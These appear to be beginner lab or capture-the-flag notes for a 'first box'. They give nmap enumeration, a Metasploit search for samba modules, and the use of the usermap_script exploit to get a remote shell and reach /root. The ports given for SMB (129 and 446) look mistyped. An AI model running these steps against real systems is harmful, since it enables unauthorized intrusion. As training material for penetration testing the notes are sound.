# First Box

## Terminal setup

Either be in root or use sudo. 
Create three tabs (VPN, NMAP, HACK).

## Enumeration

First scans
```
# nmap -sV -sC -A -oN <ip address.txt>  <ip address>
```

Note the smb on ports 129 and 446.  Start metasploit console and search for samba
```
# msfconsole

msf5> search samba
```

Review the excellent ranked modules
```
msf5> info /exploit/linux/samba
msf5> info /exploit/multi/samba/usermap_script
```

Note: can use searchsploit to avoid the startup

```
# searchsploit <service> <version>
```


## Attack

To execute
```
msf5> use /exploit/multi/samba/usermap_script
msf5 exploit(multi/samba/usermap_script) >  show options
msf5 exploit(multi/samba/usermap_script) >  set RHOST <ip address>
msf5 exploit(multi/samba/usermap_script) >  exploit
```

This will create a command shell back in the terminal

## Endgame

summary
```
id
pwd
cd /home/<user>
cd /root
```
